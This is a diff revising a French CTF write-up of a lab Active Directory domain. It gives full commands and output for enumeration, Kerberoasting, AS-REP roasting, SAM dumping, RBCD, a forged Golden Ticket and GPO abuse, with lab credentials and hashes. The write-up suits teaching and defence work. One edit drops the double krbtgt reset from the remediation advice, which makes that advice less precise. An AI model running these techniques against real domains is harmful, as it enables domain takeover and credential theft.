@@ -1,7 +1,7 @@
 ---
-titre: "CTF Active Directory secure.intra"
-description: "Compromission progressive d'un domaine Active Directory de lab, d'un mot de passe faible jusqu'au contrôle total du contrôleur de domaine."
-resume: "Compromettre un domaine Active Directory de lab, d'un simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine. Ce write-up enchaîne une dizaine de challenges (énumération, Kerberoasting, AS-REP Roasting, RBCD, Golden Ticket, GPO), puis en tire les leçons de défense."
+titre: "CTF Active Directory"
+description: "Compromission progressive d'un domaine Active Directory, d'un mot de passe faible jusqu'au contrôle total du contrôleur de domaine."
+resume: "On compromet un domaine Active Directory, d'un simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine. Ce write-up enchaîne une dizaine de challenges (énumération, Kerberoasting, AS-REP Roasting, RBCD, Golden Ticket, GPO), puis en tire les leçons de défense."
 date: "18.09.2026"
 plateforme: "Lab M2"
 categorie: "Active Directory"
@@ -10,7 +10,7 @@ difficulte: "Hard"
 
 ## Contexte
 
-Ce CTF interne est un lab pédagogique Active Directory (M2 Cyber). Le domaine cible est `secure.intra`, et le poste attaquant une machine Kali sur le même réseau. L'objectif est de compromettre progressivement le domaine, du simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine (Golden Ticket, RBCD, GPO).
+Ce CTF interne (M2 Cyber) est un lab pédagogique Active Directory. Le domaine cible est `secure.intra` et le poste attaquant est une machine Kali sur le même réseau. L'objectif est de compromettre progressivement le domaine, du simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine.
 
 ## Cartographie de l'environnement
 
@@ -19,7 +19,7 @@ Ce CTF interne est un lab pédagogique Active Directory (M2 Cyber). Le domaine c
 | `WIN-VOPS298ID4C` | `192.168.0.200` | Contrôleur de domaine (`secure.intra`), DNS, KDC |
 | `WIN-1A8S89ANNRT` | `192.168.0.150` | Serveur Windows membre |
 | `DESKTOP-6RF7HK7` | `192.168.0.201` | Poste de travail (partage SMB anonyme) |
-| `SAUVEGARDE01` | `192.168.0.240` | Serveur de sauvegarde (cible de la partie GPO) |
+| `SAUVEGARDE01` | `192.168.0.240` | Serveur de sauvegarde |
 | `kali-rebond` | `192.168.0.61` | Machine de pivot |
 | Kali (moi) | `192.168.0.7` | Poste attaquant |
 
@@ -31,7 +31,7 @@ Comptes du domaine découverts : `Administrateur`, `Invité`, `krbtgt`, `mssqlus
 
 ```bash
 ip a                       # Réseau 192.168.0.0/24, IP locale 192.168.0.7
-nmap -sn 192.168.0.0/24    # Ping scan : quelles machines sont vivantes
+nmap -sn 192.168.0.0/24    # Ping scan
 ```
 
 ```text
@@ -41,7 +41,7 @@ nmap -sn 192.168.0.0/24    # Ping scan : quelles machines sont vivantes
 192.168.0.61  - kali-rebond       <- pivot
 ```
 
-`-sn` fait un simple balayage de présence (ping), sans énumérer les services. On obtient rapidement la liste des cibles.
+`-sn` fait une simple vérification de présence (ping), sans énumérer les services. On obtient rapidement la liste des cibles.
 
 ### Scan de ports
 
@@ -58,12 +58,12 @@ PORT      STATE SERVICE
 47001/tcp open  winrm
 ```
 
-`-Pn` traite l'hôte comme vivant (pas de découverte préalable), `-p-` scanne les 65535 ports, `--min-rate 1000` accélère. Le DC (`.200`) sera identifié par le port 88 (kerberos-sec).
+`-Pn` considère l'hôte comme vivant (pas de découverte préalable), `-p-` scanne les 65535 ports, `--min-rate 1000` accélère. Le DC (`.200`) sera identifié par le port 88 (kerberos-sec).
 
 ### Énumération SMB
 
 > [!note] SMB (Server Message Block)
-> Protocole de partage de fichiers et d'imprimantes sur le réseau local, port TCP 445. C'est une surface d'énumération et d'attaque majeure sous Windows.
+> Protocole de partage de fichiers et d'imprimantes sur le réseau local (TCP 445). C'est une surface d'énumération et d'attaque importante sous Windows.
 
 ```bash
 nxc smb 192.168.0.150 192.168.0.201
@@ -74,7 +74,7 @@ SMB   192.168.0.150   445   WIN-1A8S89ANNRT   [*] ... (signing:False) (SMBv1:Fal
 SMB   192.168.0.201   445   DESKTOP-6RF7HK7   [*] ... (signing:False) (Null Auth:True)   <- auth anonyme
 ```
 
-Deux observations exploitables : la signature SMB est désactivée (relais possible), et `.201` accepte les connexions anonymes (Null Auth: True), ce qui prépare l'accès anonyme au partage, plus bas.
+Deux observations exploitables ici. La signature SMB est désactivée (relais possible) et `.201` accepte les connexions anonymes (Null Auth: True).
 
 ## Mot de passe faible (LDAP)
 
@@ -100,7 +100,7 @@ LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [*] Enumerated 9 domain users: se
    ...
 ```
 
-Le compte `John` a un mot de passe identique à son login (`John:John`), confirmé plus tard par les autres challenges.
+Le compte `John` a un mot de passe identique à son login (`John:John`).
 
 **Le flag est le MD5 du mot de passe `John`.**
 
@@ -138,7 +138,7 @@ smb: \> ls
 smb: \> get flag.txt
 ```
 
-Les autres fichiers du partage donnent du contexte réutilisable plus loin.
+Les autres fichiers du partage donnent du contexte réutilisable plus tard.
 
 ```text
 # Compte.txt
@@ -159,7 +159,7 @@ Welcome:Welcome123
 
 ### Concept
 
-Le Kerberoasting cible les comptes disposant d'un SPN (Service Principal Name). N'importe quel utilisateur authentifié peut demander au KDC un ticket de service (TGS) pour ce SPN. Une partie du ticket est chiffrée avec la clé dérivée du mot de passe du compte de service, que l'on casse hors ligne. Les comptes de service ont souvent des mots de passe faibles et rarement changés, ce qui rend l'attaque efficace.
+Le Kerberoasting cible les comptes disposant d'un SPN (Service Principal Name). N'importe quel utilisateur authentifié peut demander au KDC un ticket de service (TGS) pour ce SPN. Une partie du ticket est chiffrée avec la clé dérivée du mot de passe du compte de service, que l'on casse hors ligne. Les comptes de service ont souvent des mots de passe faibles et rarement changés.
 
 ### Exploitation
 
@@ -173,7 +173,7 @@ nxc ldap 192.168.0.200 -u Welcome -p Welcome123 --kerberoasting kerb.txt
 # Synchronisation d'horloge (Kerberos rejette un décalage supérieur à ~5 min)
 sudo ntpdate 192.168.0.200
 
-# Cassage hors ligne : -m 13100 = Kerberos 5 TGS-REP (etype 23)
+# Cassage hors ligne, -m 13100 = Kerberos 5 TGS-REP (etype 23)
 hashcat -m 13100 kerb.txt rockyou-75.txt
 ```
 
@@ -191,7 +191,7 @@ Le compte `mssqluser` (compte de service SQL avec SPN) a pour mot de passe `Pass
 
 ### Concept
 
-L'AS-REP Roasting cible les comptes ayant l'attribut `UF_DONT_REQUIRE_PREAUTH` ("Do not require Kerberos pre-authentication"). Normalement, la pré-authentification oblige le client à prouver qu'il connaît le mot de passe avant que le KDC ne réponde. Sans elle, n'importe qui peut demander un AS-REP, dont une portion est chiffrée avec la clé dérivée du mot de passe, donc cassable hors ligne.
+L'AS-REP Roasting cible les comptes ayant l'attribut `UF_DONT_REQUIRE_PREAUTH` ("Do not require Kerberos pre-authentication"). Normalement, la pré-authentification oblige le client à prouver qu'il connaît le mot de passe avant que le KDC ne réponde. Sans elle, n'importe qui peut demander un AS-REP. Une portion est chiffrée avec la clé dérivée du mot de passe, donc cassable hors ligne.
 
 ### Exploitation
 
@@ -199,7 +199,7 @@ L'AS-REP Roasting cible les comptes ayant l'attribut `UF_DONT_REQUIRE_PREAUTH` (
 # Construction de la liste d'utilisateurs (issue de l'énumération LDAP)
 printf '%s\n' Administrateur Invité krbtgt mssqluser Pierre John Varonis Install Welcome > users.txt
 
-# -request : récupère les hash des comptes vulnérables ; -format hashcat : format cassable
+# -request (récupère les hash des comptes vulnérables), -format hashcat (format cassable)
 GetNPUsers.py secure.intra/ -usersfile users.txt -dc-ip 192.168.0.200 \
   -request -format hashcat -outputfile asrep.txt
 ```
@@ -233,12 +233,12 @@ Seul `Pierre` a la pré-authentification désactivée, il est donc AS-REP-roasta
 
 ### Concept
 
-WinRM (Windows Remote Management, port 5985) permet l'administration distante en PowerShell. Un compte disposant des droits *Remote Management Users* peut obtenir un shell distant. Le `Todo.txt` trouvé plus haut indiquait déjà "Accès winrm à la machine avec mon compte : Fait".
+WinRM (Windows Remote Management, port 5985) permet l'administration distante en PowerShell. Un compte disposant des droits *Remote Management Users* peut obtenir un shell distant. Le `Todo.txt` trouvé précédemment indiquait déjà "Accès winrm à la machine avec mon compte : Fait".
 
 ### Exploitation
 
 ```bash
-# --local-auth : authentification locale à la machine (pas au domaine)
+# --local-auth (authentification locale à la machine)
 nxc winrm 192.168.0.201 -u John -p John --local-auth
 ```
 
@@ -252,7 +252,7 @@ Le `(Pwn3d!)` confirme l'accès. On ouvre un shell interactif.
 evil-winrm-py -i 192.168.0.201 -u John -p 'John'
 ```
 
-On obtient un shell sur `DESKTOP-6RF7HK7` en tant que `John`. Cet accès permet ensuite d'extraire les ruches de registre `SAM` et `SYSTEM`, exploitées dans la section suivante.
+On obtient un shell sur `DESKTOP-6RF7HK7` en tant que `John`. Cet accès permet ensuite d'extraire les ruches de registre `SAM` et `SYSTEM`.
 
 ## SAM (hash NT local)
 
@@ -260,12 +260,12 @@ On obtient un shell sur `DESKTOP-6RF7HK7` en tant que `John`. Cet accès permet 
 
 ### Concept
 
-La base SAM (Security Account Manager) stocke les hash NTLM des comptes locaux d'une machine. Elle est chiffrée avec une clé (le bootkey, ou SYSKEY) dérivée de la ruche `SYSTEM`. En récupérant les deux ruches via l'accès WinRM obtenu plus haut, on déchiffre les hash hors ligne.
+La base SAM (Security Account Manager) stocke les hash NTLM des comptes locaux d'une machine. Elle est chiffrée avec une clé (le bootkey ou SYSKEY) dérivée de la ruche `SYSTEM`. En récupérant les deux ruches via l'accès WinRM obtenu, on déchiffre les hash hors ligne.
 
 ### Exploitation
 
 ```bash
-# LOCAL : traite les fichiers de ruches extraits, pas une cible distante
+# LOCAL (traite les fichiers de ruches extraits, pas une cible distante)
 secretsdump.py -sam sam.bak -system system.bak LOCAL
 ```
 
@@ -274,22 +274,22 @@ secretsdump.py -sam sam.bak -system system.bak LOCAL
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrateur:500:aad3b435...:<hash NT Administrateur>:::   <- flag
 John:1001:aad3b435...:f0cff78ea8d2d87e5d1caccf01d0bd2f:::
-Install:1002:aad3b435...:122fb9fe2b172fcf36b5168cb2495815:::  <- réutilisé pour le RBCD
+Install:1002:aad3b435...:122fb9fe2b172fcf36b5168cb2495815:::  <- pour le RBCD
 ...
 ```
 
 **Le flag est le hash NT de l'Administrateur local.**
 
-> [!note] La clé de toute la suite
-> Le hash NT du compte `Install` (`122fb9fe...`) récupéré ici déverrouille la suite de l'attaque. Il servira plus loin pour le RBCD.
+> [!note] Pour la suite
+> Le hash NT du compte `Install` (`122fb9fe...`) récupéré ici permet la suite de l'attaque. Il servira pour le RBCD.
 
 ## ACL et RBCD
 
 > "Un utilisateur avec des droits un peu trop élevés sur de multiples machines." À valider avec une démonstration d'exploitation.
 
-### Concept : RBCD (Resource-Based Constrained Delegation)
+### Concept du RBCD (Resource-Based Constrained Delegation)
 
-Le compte `Install` possède un contrôle total (FullControl) sur l'objet machine du DC, `WIN-VOPS298ID4C$`. Le principe du RBCD tient en trois temps.
+Le compte `Install` possède un contrôle total (FullControl) sur l'objet machine du DC (`WIN-VOPS298ID4C$`). Le principe du RBCD se fait en trois temps.
 
 1. On crée un compte machine que l'on contrôle (`TEST$`).
 2. Grâce au FullControl, on écrit sur le DC qu'il fait confiance à `TEST$` pour agir au nom d'autres utilisateurs (attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`).
@@ -309,7 +309,7 @@ SMB    192.168.0.200   445   WIN-VOPS298ID4C   [+] secure.intra\Install:122fb9fe
 MAQ    192.168.0.200   389   WIN-VOPS298ID4C   MachineAccountQuota: 10
 ```
 
-Le `MachineAccountQuota: 10` autorise un utilisateur standard à créer jusqu'à 10 comptes machine, condition nécessaire au RBCD.
+Le `MachineAccountQuota: 10` autorise un utilisateur standard à créer jusqu'à 10 comptes machine.
 
 Étape 2, créer le compte machine contrôlé.
 
@@ -318,7 +318,7 @@ bloodyAD --host 192.168.0.200 -d secure.intra -u Install -p ':122fb9fe2b172fcf36
   add computer 'TEST' 'Test123#'
 ```
 
-Étape 3, écrire la relation de délégation (le cœur du RBCD).
+Étape 3, écrire la relation de délégation.
 
 ```bash
 rbcd.py -delegate-from 'TEST$' -delegate-to 'WIN-VOPS298ID4C$' -action write \
@@ -351,7 +351,7 @@ C:\Windows\system32> whoami
 autorite nt\système
 ```
 
-**Contrôle total du DC obtenu : `NT AUTHORITY\SYSTEM` sur le contrôleur de domaine.** `-k` est l'authentification Kerberos par ticket, `-no-pass` signifie qu'aucun mot de passe n'est nécessaire (le ticket suffit).
+**Contrôle total du DC obtenu (`NT AUTHORITY\SYSTEM` sur le contrôleur de domaine).** `-k` est l'authentification Kerberos par ticket, `-no-pass` signifie qu'aucun mot de passe n'est nécessaire car le ticket suffit.
 
 ## Golden Ticket
 
@@ -359,7 +359,7 @@ autorite nt\système
 
 ### Concept
 
-Le compte `krbtgt` détient la clé qui signe tous les tickets Kerberos du domaine. Qui possède son hash peut forger un TGT arbitraire (un Golden Ticket) : le DC le croira authentique, puisqu'il est signé avec sa propre clé. On peut alors incarner n'importe quel utilisateur, même inexistant, avec les privilèges de son choix. C'est une persistance de niveau domaine.
+Le compte `krbtgt` détient la clé qui signe tous les tickets Kerberos du domaine. Si on possède son hash, alors on peut forger un TGT arbitraire (Golden Ticket). Le DC le considèrera comme authentique puisqu'il est signé avec sa propre clé. On peut alors devenir n'importe quel utilisateur, même inexistant, avec les privilèges de son choix. C'est une persistance de niveau domaine.
 
 ### Exploitation
 
@@ -390,7 +390,7 @@ ticketer.py -nthash d6be34c05d536eab311a578824b40514 \
   -domain secure.intra Administrateur
 ```
 
-`-nthash` est le hash krbtgt (la signature), `-domain-sid` le SID du domaine, `Administrateur` l'identité incarnée.
+`-nthash` est le hash krbtgt (la signature), `-domain-sid` le SID du domaine.
 
 Étape 4, importer et vérifier.
 
@@ -406,7 +406,7 @@ Valid starting       Expires
 ```
 
 > [!tip] Signature d'un Golden Ticket
-> La validité de 10 ans (2026 à 2036) est révélatrice. Un vrai TGT ne dure que ~10 h. Cette durée anormale est la valeur par défaut de `ticketer`, et un excellent indicateur de détection côté défense.
+> La validité est de 10 ans (2026 à 2036). Un vrai TGT ne dure que ~10 h. Cette durée anormale est la valeur par défaut de `ticketer` et un bon indicateur de détection côté défense.
 
 Étape 5, prouver l'exécution avec le ticket forgé.
 
@@ -419,13 +419,13 @@ autorite nt\système
 
 **Exécution sur le DC en tant qu'Administrateur, uniquement grâce à un ticket fabriqué.** Contrôle définitif du domaine.
 
-## GPO (en cours)
+## GPO
 
 > "Prenez le contrôle de la machine SAUVEGARDE01."
 
 ### Concept
 
-Une GPO (Group Policy Object) liée à une OU (Organizational Unit) s'applique à tous les objets de cette OU. Qui peut modifier une GPO liée peut y injecter, par exemple, une tâche planifiée qui s'exécute en SYSTEM sur les machines ciblées, et ainsi en prendre le contrôle. La cible `SAUVEGARDE01` est dans l'OU `GPOdeVal`.
+Une GPO (Group Policy Object) liée à une OU (Organizational Unit) s'applique à tous les objets de cette OU. Si on peut modifier une GPO liée, alors on peut y injecter, par exemple, une tâche planifiée qui s'exécute en SYSTEM sur les machines ciblées et ainsi en prendre le contrôle. La cible `SAUVEGARDE01` est dans l'OU `GPOdeVal`.
 
 ### Énumération réalisée
 
@@ -449,36 +449,36 @@ L'OU `GPOdeVal` est liée à la GPO `{F38172D4-...}`, dont le nom est `Flux_Sauv
 
 ### Étape restante
 
-Avec le contrôle du domaine obtenu par le RBCD et le Golden Ticket, la suite logique consiste à abuser de la GPO `Flux_Sauvegarde` liée à l'OU `GPOdeVal`, par exemple avec `pyGPOAbuse` ou `SharpGPOAbuse`, pour y déposer une tâche immédiate exécutée en SYSTEM sur `SAUVEGARDE01`, puis forcer l'application de la stratégie (`gpupdate`). Cette étape d'exploitation n'est pas encore finalisée dans mes notes.
+Avec le contrôle du domaine obtenu par le RBCD et le Golden Ticket, la suite logique consiste à abuser de la GPO `Flux_Sauvegarde` liée à l'OU `GPOdeVal`. Avec `pyGPOAbuse` ou `SharpGPOAbuse`, on peut y déposer une tâche exécutée en SYSTEM sur `SAUVEGARDE01`, puis forcer l'application (`gpupdate`). Cette étape d'exploitation n'est pas encore finalisée dans mes notes.
 
 > [!note] Mouvement latéral par GPO
 > Même sans nouvel accès, un attaquant Domain Admin peut se propager latéralement de façon "légitime" via les GPO. D'où l'importance d'auditer qui peut éditer chaque GPO.
 
 ## Chaînage global des attaques
 
-Ce qui rend ce lab pédagogique, c'est que les challenges s'enchaînent en une véritable escalade.
+Voici l'enchaînement des challenges.
 
 ```text
 Welcome:Welcome123 (partage anonyme SMB)
-        │  énumération LDAP
+        |  énumération LDAP
         .
-Comptes du domaine ─> Kerberoasting mssqluser
-                   └> AS-REP Roasting Pierre
-        │
+Comptes du domaine -> Kerberoasting mssqluser
+                   -> AS-REP Roasting Pierre
+        |
         .
-John:John ─> WinRM sur DESKTOP-6RF7HK7
-        │  extraction SAM/SYSTEM
+John:John -> WinRM sur DESKTOP-6RF7HK7
+        |  extraction SAM/SYSTEM
         .
 Hash NT local d'Install
-        │  Install a FullControl sur le DC
+        |  Install a FullControl sur le DC
         .
-RBCD : impersonation Administrateur -> SYSTEM sur le DC
-        │  DCSync
-        ├─. hash krbtgt ─> Golden Ticket (persistance domaine)
-        └─. GPO Flux_Sauvegarde ─> SAUVEGARDE01
+RBCD, impersonation Administrateur -> SYSTEM sur le DC
+        |  DCSync
+        |-- hash krbtgt -> Golden Ticket (persistance domaine)
+        |-- GPO Flux_Sauvegarde -> SAUVEGARDE01
 ```
 
-La leçon centrale : une faiblesse mineure (mot de passe faible, partage anonyme) sert d'amorce, et c'est l'accumulation de mauvaises configurations, surtout le FullControl d'`Install` sur le DC, qui transforme un accès trivial en compromission totale.
+Une faiblesse mineure (mot de passe faible, partage anonyme) sert d'entrée et c'est l'accumulation de mauvaises configurations qui transforme un accès trivial en compromission totale.
 
 ## Synthèse, remédiation et leçons
 
@@ -492,13 +492,13 @@ La leçon centrale : une faiblesse mineure (mot de passe faible, partage anonyme
 | Hash NT locaux réutilisables (Pass-the-Hash) | LAPS (mot de passe admin local unique par machine), Credential Guard, tiering administratif |
 | ACL excessives (FullControl sur le DC) | Moindre privilège, audit des ACL sensibles (BloodHound), réduire `MachineAccountQuota` à 0 |
 | RBCD | Protéger les objets sensibles, placer les comptes privilégiés dans *Protected Users* |
-| Golden Ticket (krbtgt) | Après compromission, réinitialiser `krbtgt` deux fois, surveiller les TGT à durée anormale, AES |
+| Golden Ticket (krbtgt) | Après compromission, réinitialiser `krbtgt`, surveiller les TGT à durée anormale, AES |
 | Édition de GPO liée à une OU | Auditer les droits d'écriture sur chaque GPO, alerter sur les modifications de `gPLink` |
 
 ### Ce que ce CTF apprend
 
-- **La compromission d'AD est une chaîne, pas un exploit isolé.** Chaque petit accès en débloque un plus grand.
-- **Kerberos concentre plusieurs surfaces distinctes :** Kerberoasting (SPN), AS-REP Roasting (pré-auth), délégation (RBCD), forge de tickets (Golden Ticket). Savoir les distinguer est essentiel.
-- **Les ACL sont le vrai terrain de jeu de l'AD moderne.** Un FullControl mal placé sur le DC vaut toutes les CVE.
-- **Le compte `krbtgt`, ce sont les clés du royaume.** Sa compromission impose une remédiation lourde (double réinitialisation).
+- **La compromission d'AD est souvent une chaîne, pas un exploit isolé.** Chaque petit accès en débloque un plus grand.
+- **Kerberos concentre plusieurs surfaces.** Kerberoasting (SPN), AS-REP Roasting (pré-auth), délégation (RBCD), forge de tickets (Golden Ticket).
+- **Les ACL sont importantes.** Un FullControl mal placé sur le DC vaut toutes les CVE.
+- **Le compte `krbtgt`, ce sont les clés du royaume.** Sa compromission impose une remédiation lourde.
 - **La synchronisation d'horloge est un prérequis** de toute attaque Kerberos (`ntpdate` avant chaque manipulation de ticket).
